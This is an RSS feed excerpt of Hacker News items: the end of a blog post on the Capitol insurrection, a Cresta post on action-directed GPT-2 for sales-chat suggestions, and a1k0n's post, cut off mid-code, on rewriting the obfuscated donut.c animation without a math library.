<p>I don‚Äôt know what form the continuation of the trends that led to the Capitol Insurrection will take, if there will be further attempts at violent disruption in D.C. itself, or if we‚Äôll see a shift to a campaign of domestic terror (something like <a href="https://en.wikipedia.org/wiki/The_Troubles">The Troubles</a>, in terms of the violence committed), or if, as with the Nazis after the failure of the <a href="https://en.wikipedia.org/wiki/Beer_Hall_Putsch">Beer Hall Putsch</a>, the folks who supported this insurrection will focus on trying to use the democratic process to abolish the democratic process.  <strong>But this is not over</strong>.  There is abundant polling evidence that among a minority of Americans (but a plurality or majority of Republicans; we‚Äôll come back to that) support for the lies (that the election was fraudulent, <em><a href="https://factcheck.thedispatch.com/p/fact-check-debunking-donald-trumps">which it wasn‚Äôt</a></em>; the liars were <a href="https://beta.documentcloud.org/documents/20423518-trump_case_decision">given plenty of chances to provide any evidence at all</a> for their lies and they didn‚Äôt) remains high.  As in 545, a great many Americans still support Peisistratos.  Some smaller subset of them have bought into messianic conspiracy theories like Q-Anon which fairly transparently could lead to considerable violence. <strong> The underlying conditions that made the tyrannical attempt possible still exist</strong>, so we should expect ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/">https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</a></em></p>]]>
            </description>
            <link>https://acoup.blog/2021/01/15/miscellanea-insurrections-ancient-and-modern-and-also-meet-the-academicats/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787594</guid>
            <pubDate>Fri, 15 Jan 2021 06:12:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Large language models are wild, but can you control them?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25787553">thread link</a>) | @strin
<br/>
January 14, 2021 | https://cresta.com/blog/action-directed-gpt-2 | <a href="https://web.archive.org/web/*/https://cresta.com/blog/action-directed-gpt-2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At Cresta, we empower sales and support agents that talk to their customers over chat to become experts on day one. We do that by providing them real-time suggestions about how they should respond to their customers. The suggestions as shown in the image below are fully formed responses that can either be sent directly or after light editing by the agents.</p>
<figure id="attachment_19262" aria-describedby="caption-attachment-19262"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png" alt="" width="619" height="350" srcset="https://d33wubrfki0l68.cloudfront.net/d3c7caf02b9a1ab5f6701f8ccd10d325078eb4f7/f9016/static/c9c87ceb0c53cb006de480b937669d61/gpt-2.png 619w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034053/gpt-2-300x170.png 300w" sizes="(max-width: 619px) 100vw, 619px"><figcaption id="caption-attachment-19262">Agents can choose to respond with these generated suggestions.</figcaption></figure>
<p>By suggesting great responses, we help sales agents sell more and help support agents resolve issues quickly. These suggestions also make agents more efficient by saving them a lot of time from manually typing responses.</p>
<p>With this blog, we would like to share an exciting new machine learning model we designed and deployed in early 2020, to generate these expert suggested responses which have driven improvements in sales conversion for our customers</p>
<p>But before introducing the new model, let‚Äôs understand the general problem we are trying to solve by focusing on the domain of sales.</p>
<h2>ML for Sales Conversations</h2>
<p>When a sales representative joins a new company, they spend about 6 months learning the ropes and gaining experience until becoming completely effective in their roles. Traditionally, the agents are coached by a sales leader who would listen to conversations and jump in at the right moment to guide the representative. The sales leader may tell the agent to take actions like ‚ÄúAsk for a sale‚Äù, ‚ÄúDiscover customer‚Äôs needs‚Äù, ‚ÄúGreet the customer‚Äù etc. In the context of live chat, it‚Äôs valuable to have a real-time coach to guide responses.</p>
<p>Cresta‚Äôs platform helps to solve this training problem by creating individualized responses for each agent. At appropriate moments in the conversation, sales agents can use these suggestions to answer customer inquiries more quickly and more effectively. Our models analyze the ongoing sales conversation to understand the situation, and then suggest the next best response to say according to the next best action to take.</p>
<h2>Language Models for Dialog</h2>
<p>The problem of generating the next response can be solved by training a language model on a dataset of conversations. When we represent dialog as text, we can train a language model on that text and then ask the language model to generate the probable next response given an in-progress conversation. In practice, we have seen that this method works well as pre-trained language models have become very powerful in the past 2 years. These language models usually generate coherent responses.</p>
<p>But just generating coherent responses is not enough. We also want the system to generate the best response to reach the goal of successfully converting a sale. However, a major problem with such language models is that they are difficult to control. This means that it is hard to ask the model to generate a certain type of response.</p>
<p>Now, for example, imagine Alice and Bob are having a conversation‚Ä¶</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png" alt="" width="2000" height="996" srcset="https://d33wubrfki0l68.cloudfront.net/bcb41bae9d573eb45ecb5663834db24784e8cd1a/0f1e7/static/c6ff145ede3bf02bcce9ee10ebcece3e/gpt-2-1.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-300x149.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1024x510.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-768x382.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1536x765.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1200x598.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034049/gpt-2-1-1980x986.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"></p>
<p>All the possible responses by Bob are valid responses that a language model might generate. These responses correspond to different actions that Bob might take. We want to control language models to generate responses that help Bob achieve his goal, whatever that might be.</p>
<h2>Need for Controlling language models</h2>
<p>At Cresta, the language model is trained on the real chats of agents, and we find that different agents respond differently to the same situation. We also find that not every agent in a conversation answers perfectly. All this leads to high variance and noise in the training dataset. Thus from this dataset, the model learns a wide distribution of the next possible responses. Since the trained model is more uncertain about the next response, it becomes hard for the model to generate the best response reliably.</p>
<p>In the field of sales, agents use a call-flow which describes what sequence of actions they ideally need to make to get the sale. The best next action for instance could be to ask to close a sale during an appropriate opportunity. To improve the probability of agents making a successful sale, we also want our models to generate a response according to the best next action in that situation. Certainly, a model that generates text that is all over the place won‚Äôt suffice.</p>
<p>With our analysis, we also verified that when agents follow the best sequence of actions, it leads to significantly higher sales as shown in the analysis below.</p>
<figure id="attachment_19258" aria-describedby="caption-attachment-19258"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/9f56b1d58e734c358b3bc279a70a3065ee0db37d/3362f/static/d1eb97d18515af49c082d840a5178c91/gpt-2-2.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19258">For the chats by expert agents that converted in sales, we see that they largely follow the call-flow. e.d. means edit distance of the real conversation from the call-flow. For example, e.d. of 1 means that the agent deviated by 1 action from the call-flow.</figcaption></figure>
<figure id="attachment_19256" aria-describedby="caption-attachment-19256"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/e9435e03b89fca5e74dba02bc22d9bf142bf13b8/ca507/static/cbc474416957f16a7790ed95e2d180e9/gpt-2-3.svg" alt="" width="600" height="371"><figcaption id="caption-attachment-19256">For the chats by all the agents that did not convert in a sale, we see that they deviate strongly from the call-flow.</figcaption></figure>
<p>Instead of relying on training with a maximum likelihood objective to maximize the probability of the next token in the training corpus [1], we want to generate goal-directed responses following a call-flow that maximizes the business metric of sales conversion.</p>
<p>To solve this problem, we designed a controllable language model called ‚ÄúAction-directed GPT-2.‚Äù</p>
<h2>Action Directed GPT-2</h2>
<p>Since we want sales agents to follow a call-flow that defines the best sequence of actions they need to make to make a sale, we also want the suggestions to follow that call-flow.</p>
<p>We break the problem of suggestions following a call-flow into two parts-</p>
<ol>
<li>Predict the next best action.</li>
<li>Generate a good response for that action.</li>
</ol>
<p>A typical classical dialog state tracking system also follows a similar architecture where it uses a dialog policy to predict the next action and then selects the response based on a template. According to our experience, such a system does not work well because the real-world conversations are too complex to model with a finite number of states. Even if we were to model the states correctly, the text generations from a template would seem robotic and would not be contextually adapted to the current conversation. These reasons lead to low usage of such suggestions by the sales agents.</p>
<p>To successfully generate contextually accurate responses that follow the correct next action, we train GPT-2, [2] a large language model, to model the problem as learning the probability of the next response given the current state of the conversation and the next best action. This is represented in the figure below.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/5f52a28a7ef6881f6510f74ee2e91b0033447833/a26ee/static/ae3a505a7381edcead0e7f4136248f55/gpt-2-4.png" alt="" width="1690" height="836" srcset="https://d33wubrfki0l68.cloudfront.net/5f52a28a7ef6881f6510f74ee2e91b0033447833/a26ee/static/ae3a505a7381edcead0e7f4136248f55/gpt-2-4.png 1690w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-300x148.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1024x507.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-768x380.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1536x760.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034045/gpt-2-4-1200x594.png 1200w" sizes="(max-width: 1690px) 100vw, 1690px"></p>
<h2>Data representation for Action Directed GPT-2 model</h2>
<p>There are multiple possible approaches for feeding the action information to the model. This includes adding an extra embedding layer to GPT2 which learns an action-dependent embedding that represents the action a message performs. Although through experimentation, we discovered that representing actions inline as text resulted in a model that is easier to work with, which also performs very well.</p>
<p>Following is an example of the textual representation on a hypothetical chat with hypothetical actions. Over here, the text in <strong>bold</strong> is the action label for the following message.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/72cd822bf8646fe7d012f515bbedb50ed12923dc/f9666/static/03c99690032af316c57d1a672e5990a4/gpt-2-4-1.png" alt="" width="1295" height="583" srcset="https://d33wubrfki0l68.cloudfront.net/72cd822bf8646fe7d012f515bbedb50ed12923dc/f9666/static/03c99690032af316c57d1a672e5990a4/gpt-2-4-1.png 1295w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-300x135.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-1024x461.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-768x346.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034746/gpt-2-4-1-1200x540.png 1200w" sizes="(max-width: 1295px) 100vw, 1295px"></p>
<h2>Training and inference</h2>
<p>With this representation, we require action labels for messages in the training set and since there can be millions of such messages, it is not feasible to label them manually. We instead use action classification models to label agent messages in the entire training set with their corresponding actions. The messages can also be classified as no action performed, and there is no inline action label for such a case. When all the training set chats are annotated, we use the resulting text representation to train a standard GPT-2 model. GPT-2 being a causal language model, learns to map an action to its associated agent message. Training with a standard language modeling loss function and gradient descent results in the model automatically learning the relationship of the next response to the action and the chat context.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/5c531c8018ec95755a7908f0d61cfdf0a3b6e963/7367e/static/a1723095918f2185bb406593b14f4a63/gpt-2-5.png" alt="" width="1321" height="306" srcset="https://d33wubrfki0l68.cloudfront.net/5c531c8018ec95755a7908f0d61cfdf0a3b6e963/7367e/static/a1723095918f2185bb406593b14f4a63/gpt-2-5.png 1321w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-300x69.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-1024x237.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-768x178.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034044/gpt-2-5-1200x278.png 1200w" sizes="(max-width: 1321px) 100vw, 1321px">With this trained Action Directed GPT-2 model, given an in-progress chat and next action, we can now generate the next response which would be contextualized and follow the next action. During inference time, we take the current state of the chat, annotate each agent message with its action, take the next best action prediction of the next agent action model and convert it all to a text representation. Once we know the next action to take, there is no significant time penalty during generation so the model also demonstrates high inference performance when deployed. If the next action prediction model does not predict any action, the action directed GPT-2 model falls back to a standard language model generating a response without any action direction.</p>
<figure id="attachment_19250" aria-describedby="caption-attachment-19250"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/b10af5324f0d073c3c144bdc474936f656284493/46fdb/static/8eefb8b0eaf41e7685db2f120829fba5/gpt-2-6.png" alt="" width="2000" height="458" srcset="https://d33wubrfki0l68.cloudfront.net/b10af5324f0d073c3c144bdc474936f656284493/46fdb/static/8eefb8b0eaf41e7685db2f120829fba5/gpt-2-6.png 2000w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-300x69.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1024x234.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-768x176.png 768w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1536x352.png 1536w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1200x275.png 1200w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034042/gpt-2-6-1980x453.png 1980w" sizes="(max-width: 2000px) 100vw, 2000px"><figcaption id="caption-attachment-19250">Inference with Action Directed GPT-2</figcaption></figure>
<p>On a test set, we observe that the generations when provided with a model‚Äôs prediction of the next best action significantly improves the ability of the model to generate responses that follow the call flow.</p>
<figure id="attachment_19248" aria-describedby="caption-attachment-19248"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/bd96f5e14a8d9988cc0a4bc5cf13ef20e1dbeb39/d02ac/static/b163ddcfe338ae4fb6dbc7678a6ce2dc/gpt-2-7.png" alt="" width="1186" height="742" srcset="https://d33wubrfki0l68.cloudfront.net/bd96f5e14a8d9988cc0a4bc5cf13ef20e1dbeb39/d02ac/static/b163ddcfe338ae4fb6dbc7678a6ce2dc/gpt-2-7.png 1186w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-300x188.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-1024x641.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034040/gpt-2-7-768x480.png 768w" sizes="(max-width: 1186px) 100vw, 1186px"><figcaption id="caption-attachment-19248">We observe that when provided the next action labels, the Action directed GPT-2 model generates significantly better responses that are on the call-flow. These BLEU scores are measured per action categories.</figcaption></figure>
<p>We also see that the generations by Action Directed GPT-2 follow the next best action whereas Vanilla GPT-2 generations don‚Äôt necessarily follow the next best actions and generate suggestions that are all over the place.</p>
<p><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/38b1fe0e743fe39bd52bf0305ef46b7028783b71/57dd6/static/6261bee883679e6a559c207617ea8582/gpt-2-8.png" alt="" width="1189" height="455" srcset="https://d33wubrfki0l68.cloudfront.net/38b1fe0e743fe39bd52bf0305ef46b7028783b71/57dd6/static/6261bee883679e6a559c207617ea8582/gpt-2-8.png 1189w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-300x115.png 300w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-1024x392.png 1024w, https://clever-mrkelly.s3.us-east-2.amazonaws.com/wp-content/uploads/2021/01/13034039/gpt-2-8-768x294.png 768w" sizes="(max-width: 1189px) 100vw, 1189px"></p>
<p>After deploying the model to our customers, we found that responses generated by the Action directed GPT-2 help the agents follow the best call flows increasing our customer‚Äôs most important sales metrics.</p>
<h2>Conclusion</h2>
<p>The exciting discovery for us was to discover how simple it is to take an off-the-shelf pre-trained language model and make it controllable without changing anything about the underlying model architecture. If you take a standard pre-trained model and finetune it on a noisy dataset, you can still make the model follow perfect behavior by directing the model correctly during runtime.</p>
<p>Since it is very simple to apply this to any new problems that require ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cresta.com/blog/action-directed-gpt-2">https://cresta.com/blog/action-directed-gpt-2</a></em></p>]]>
            </description>
            <link>https://cresta.com/blog/action-directed-gpt-2</link>
            <guid isPermaLink="false">hacker-news-small-sites-25787553</guid>
            <pubDate>Fri, 15 Jan 2021 06:02:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Donut.c Without a Math Library]]>
            </title>
            <description>
<![CDATA[
Score 133 | Comments 21 (<a href="https://news.ycombinator.com/item?id=25787545">thread link</a>) | @robin_reala
<br/>
January 14, 2021 | https://www.a1k0n.net/2021/01/13/optimizing-donut.html | <a href="https://web.archive.org/web/*/https://www.a1k0n.net/2021/01/13/optimizing-donut.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>My little <a href="https://www.a1k0n.net/2011/07/20/donut-math.html">donut.c</a> has
 been making the rounds
again, after being featured in a couple YouTube videos (e.g., <a href="https://www.youtube.com/watch?v=DEqXNfs_HhY">Lex
Fridman</a> and <a href="https://www.youtube.com/watch?v=sW9npZVpiMI">Joma
Tech</a>).  If I had known how much
attention this code would get over the years, I would have spent more time on
it.</p>

<p>One thing that‚Äôs always been sort of unfortunate is the heavy use of <code>sin</code> and
<code>cos</code> ‚Äì both because it necessitates linking the math library (<code>-lm</code>), but
also because it makes it much more CPU-intensive than it really needs to be.
This is especially apparent if you try to port it to an <a href="https://twitter.com/chainq/status/1297178062937825280">older
CPU</a> or an <a href="https://twitter.com/enjoy_digital/status/1341095343816118272">embedded
device</a>.</p>

<p>So, here‚Äôs a revised version with no use of <code>sin</code>, <code>cos</code>, and no need for
linking the math library (though this version still does use <code>float</code> types).</p>

<div><div><pre><code>             i,j,k,x,y,o,N;
         main(){float z[1760],a
      #define R(t,x,y) f=x;x-=t*y\
   ;y+=t*f;f=(3-x*x-y*y)/2;x*=f;y*=f;
   =0,e=1,c=1,d=0,f,g,h,G,H,A,t,D;char
 b[1760];for(;;){memset(b,32,1760);g=0,
h=1;memset(z,0,7040);for(j=0;j&lt;90;j++){
G=0,H=1;for(i=0;i&lt;314;i++){A=h+2,D=1/(G*
A*a+g*e+5);t=G*A        *e-g*a;x=40+30*D
*(H*A*d-t*c);y=          12+15*D*(H*A*c+
t*d);o=x+80*y;N          =8*((g*a-G*h*e)
*d-G*h*a-g*e-H*h        *c);if(22&gt;y&amp;&amp;y&gt;
 0&amp;&amp;x&gt;0&amp;&amp;80&gt;x&amp;&amp;D&gt;z[o]){z[o]=D;b[o]=(N&gt;0
  ?N:0)[".,-~:;=!*#$@"];}R(.02,H,G);}R(
  .07,h,g);}for(k=0;1761&gt;k;k++)putchar
   (k%80?b[k]:10);R(.04,e,a);R(.02,d,
     c);usleep(15000);printf('\n'+(
        " donut.c! \x1b[23A"));}}
          /*no math lib needed
             .@a1k0n 2021.*/
</code></pre></div></div>

<p>It‚Äôs a little misshapen and still has comments at the bottom. I used the first
frame of its output as a template and there‚Äôs <em>slightly</em> less code than filled
pixels ‚Äì oh well. Output is pretty much the same as before:</p>


<pre id="d"></pre>



<p>So, how do we get sines and cosines without using <code>sin</code> and <code>cos</code>? Well, the
code doesn‚Äôt really <em>need</em> sine and cosine <em>per se</em>; what it actually does is
rotate a point around the origin in two nested loops, and also rotate two
angles just for the animation. If you‚Äôll recall from the other article, the
inner loop is just plotting dots in a circle, which goes around another, larger
circle. In each loop, the sine/cosine terms are just moving by a small, fixed
angle.</p>

<p>So we don‚Äôt need to track the <em>angle</em> at all, we only need to start at cos=1,
sin=0 and rotate a circle around the origin to generate all the sines and
cosines we need. We just have to repeatedly apply a fixed rotation matrix:</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \begin{bmatrix}
\cos \theta &amp; -\sin \theta \\
\sin \theta &amp; \cos \theta
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>So for example, if we were to use an angle of .02 radians in our inner loop, it would look something like:</p>
<div><div><pre><code><span>float</span> <span>c</span><span>=</span><span>1</span><span>,</span> <span>s</span><span>=</span><span>0</span><span>;</span>  <span>// c for cos, s for sin</span>
<span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>314</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>  <span>// 314 * .02 ~= 2œÄ</span>
  <span>// (use c, s in code)</span>
  <span>float</span> <span>newc</span> <span>=</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>c</span> <span>-</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>s</span><span>;</span>
  <span>s</span> <span>=</span> <span>0</span><span>.</span><span>01</span><span>9998666</span><span>*</span><span>c</span> <span>+</span> <span>0</span><span>.</span><span>9998</span><span>*</span><span>s</span><span>;</span>
  <span>c</span> <span>=</span> <span>newc</span><span>;</span>
<span>}</span>
</code></pre></div></div>



<p>That works, but there‚Äôs a problem: no matter how precisely we define our
constants, after repeated iteration of this procedure, the magnitude of our \(\left(c, s\right)\) vector will exponentially grow or shrink over time. If we
only need to make one pass around the loop, maybe we can get away with that,
but if we have to make several (for the rotating animation, we do), we need to
fix that.</p>

<p><img src="https://www.a1k0n.net/img/sincos-mag.png" alt="sine and cosine magnitude creep"><br>
<em>an exaggerated illustration of what happens when repeatedly doing low-precision rotations</em></p>

<p>The simplest way to do that would be to multiply \(c\) and \(s\) by \(1/\sqrt{c^2 + s^2}\), but then we‚Äôre back to using the math library again. Instead, we can take
advantage of the fact that our magnitude starts out very close to 1, and we‚Äôre
going to be iterating this procedure: we can do a <a href="https://en.wikipedia.org/wiki/Newton%27s_method">Newton
step</a> after each rotation, and
that will be enough to keep the magnitude ‚Äúclose enough‚Äù to 1 over time.</p>

<p>Our goal is to find the reciprocal square root (<a href="https://en.wikipedia.org/wiki/Fast_inverse_square_root">sound
familiar?</a>) of \(a =
c^2 + s^2\), our \(\left(c, s\right)\) vector magnitude.  Say we define a
function \(f(x) = \frac{1}{x^2} - a\). The function is 0 when \(x =
\frac{1}{\sqrt{a}}\). We can start with an initial guess of 1 for <em>x</em>,
perform a Newton iteration to obtain <em>x‚Äô</em>, which will be ‚Äúcloser to‚Äù
\(\frac{1}{\sqrt{a}}\), the correct value to scale <em>c</em> and <em>s</em> by so that their
magnitude \(c^2 + s^2\) is ‚Äúclose to‚Äù 1 again.</p>

<p>A Newton step is defined as \(x' = x - \frac{f(x)}{f'(x)}\). I used
<a href="https://www.sympy.org/">SymPy</a> to do the derivative and simplification and
came up with \(x' = \frac{x\left(3 - a x^2\right)}{2}\). Since we‚Äôre only doing
one step, we can plug in our initial guess of 1 for \(x\) and back-substitute
\(c^2 + s^2\) for \(a\) to finally get our adjustment: \(x' = (3 - c^2 - s^2)/2\).</p>



<p>But now that we don‚Äôt have to worry so much about the magnitude of our result
(within limits), we can take another shortcut (I got this idea studying old
<a href="https://en.wikipedia.org/wiki/CORDIC">CORDIC</a> algorithms).  If we divide out
the cosines from our original rotation matrix, we get</p>

\[\begin{bmatrix}
c' \\
s'
\end{bmatrix} = \frac{1}{\cos \theta}\begin{bmatrix}
1 &amp; -\tan \theta \\
\tan \theta &amp; 1
\end{bmatrix} \begin{bmatrix} c \\ s \end{bmatrix}\]

<p>using the trig identity \(\tan \theta = \frac{\sin \theta}{\cos \theta}\).
Since we‚Äôre only dealing with small angles, the leading \(\frac{1}{\cos
\theta}\) term is close enough to 1 that we can ignore it and have our Newton
step take care of it.</p>

<p>And now we can finally understand how the rotation is done in the code. Towards
the top of the donut code is this #define, which I‚Äôve reindented:</p>

<div><div><pre><code><span>#define R(t,x,y) \ 
</span>  <span>f</span> <span>=</span> <span>x</span><span>;</span> \
  <span>x</span> <span>-=</span> <span>t</span><span>*</span><span>y</span><span>;</span> \
  <span>y</span> <span>+=</span> <span>t</span><span>*</span><span>f</span><span>;</span> \
  <span>f</span> <span>=</span> <span>(</span><span>3</span><span>-</span><span>x</span><span>*</span><span>x</span><span>-</span><span>y</span><span>*</span><span>y</span><span>)</span><span>/</span><span>2</span><span>;</span> \
  <span>x</span> <span>*=</span> <span>f</span><span>;</span> \
  <span>y</span> <span>*=</span> <span>f</span><span>;</span>
</code></pre></div></div>

<p>This does an in-place rotation of a unit vector <code>x, y</code> where <code>t</code> is \(\tan
\theta\). <code>f</code> is a temporary variable; the first three lines do the ‚Äúmatrix
multiplication‚Äù on <code>x, y</code>. <code>f</code> is then re-used to get the magnitude adjustment,
and then finally <code>x</code> and <code>y</code> are multiplied by <code>f</code> which moves them back onto
the unit circle.</p>

<p>With that operation in hand, I just replaced all the angles with their sines
and cosines and ran the rotation operator <code>R()</code> instead of calling <code>sin</code>/<code>cos</code>.
The code is otherwise identical.</p>



<p>We can use exactly the same ideas with integer fixed-point arithmetic, and not
use any <code>float</code> math whatsoever. I‚Äôve redone all the math with 10-bit precision
and produced the following C code which runs well on embedded devices which can
do 32-bit multiplications and have ~4k of available RAM:</p>

<div><div><pre><code><span>#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span>#define R(mul,shift,x,y) \
  _=x; \
  x -= mul*y&gt;&gt;shift; \
  y += mul*_&gt;&gt;shift; \
  _ = 3145728-x*x-y*y&gt;&gt;11; \
  x = x*_&gt;&gt;10; \
  y = y*_&gt;&gt;10;
</span>
<span>int8_t</span> <span>b</span><span>[</span><span>1760</span><span>],</span> <span>z</span><span>[</span><span>1760</span><span>];</span>

<span>void</span> <span>main</span><span>()</span> <span>{</span>
  <span>int</span> <span>sA</span><span>=</span><span>1024</span><span>,</span><span>cA</span><span>=</span><span>0</span><span>,</span><span>sB</span><span>=</span><span>1024</span><span>,</span><span>cB</span><span>=</span><span>0</span><span>,</span><span>_</span><span>;</span>
  <span>for</span> <span>(;;)</span> <span>{</span>
    <span>memset</span><span>(</span><span>b</span><span>,</span> <span>32</span><span>,</span> <span>1760</span><span>);</span>  <span>// text buffer</span>
    <span>memset</span><span>(</span><span>z</span><span>,</span> <span>127</span><span>,</span> <span>1760</span><span>);</span>   <span>// z buffer</span>
    <span>int</span> <span>sj</span><span>=</span><span>0</span><span>,</span> <span>cj</span><span>=</span><span>1024</span><span>;</span>
    <span>for</span> <span>(</span><span>int</span> <span>j</span> <span>=</span> <span>0</span><span>;</span> <span>j</span> <span>&lt;</span> <span>90</span><span>;</span> <span>j</span><span>++</span><span>)</span> <span>{</span>
      <span>int</span> <span>si</span> <span>=</span> <span>0</span><span>,</span> <span>ci</span> <span>=</span> <span>1024</span><span>;</span>  <span>// sine and cosine of angle i</span>
      <span>for</span> <span>(</span><span>int</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>324</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
        <span>int</span> <span>R1</span> <span>=</span> <span>1</span><span>,</span> <span>R2</span> <span>=</span> <span>2048</span><span>,</span> <span>K2</span> <span>=</span> <span>5120</span><span>*</span><span>1024</span><span>;</span>

        <span>int</span> <span>x0</span> <span>=</span> <span>R1</span><span>*</span><span>cj</span> <span>+</span> <span>R2</span><span>,</span>
            <span>x1</span> <span>=</span> <span>ci</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x2</span> <span>=</span> <span>cA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x3</span> <span>=</span> <span>si</span><span>*</span><span>x0</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x4</span> <span>=</span> <span>R1</span><span>*</span><span>x2</span> <span>-</span> <span>(</span><span>sA</span><span>*</span><span>x3</span> <span>&gt;&gt;</span> <span>10</span><span>),</span>
            <span>x5</span> <span>=</span> <span>sA</span><span>*</span><span>sj</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x6</span> <span>=</span> <span>K2</span> <span>+</span> <span>R1</span><span>*</span><span>1024</span><span>*</span><span>x5</span> <span>+</span> <span>cA</span><span>*</span><span>x3</span><span>,</span>
            <span>x7</span> <span>=</span> <span>cj</span><span>*</span><span>si</span> <span>&gt;&gt;</span> <span>10</span><span>,</span>
            <span>x</span> <span>=</span> <span>40</span> <span>+</span> <span>30</span><span>*</span><span>(</span><span>cB</span><span>*</span><span>x1</span> <span>-</span> <span>sB</span><span>*</span><span>x4</span><span>)</span><span>/</span><span>x6</span><span>,</span>
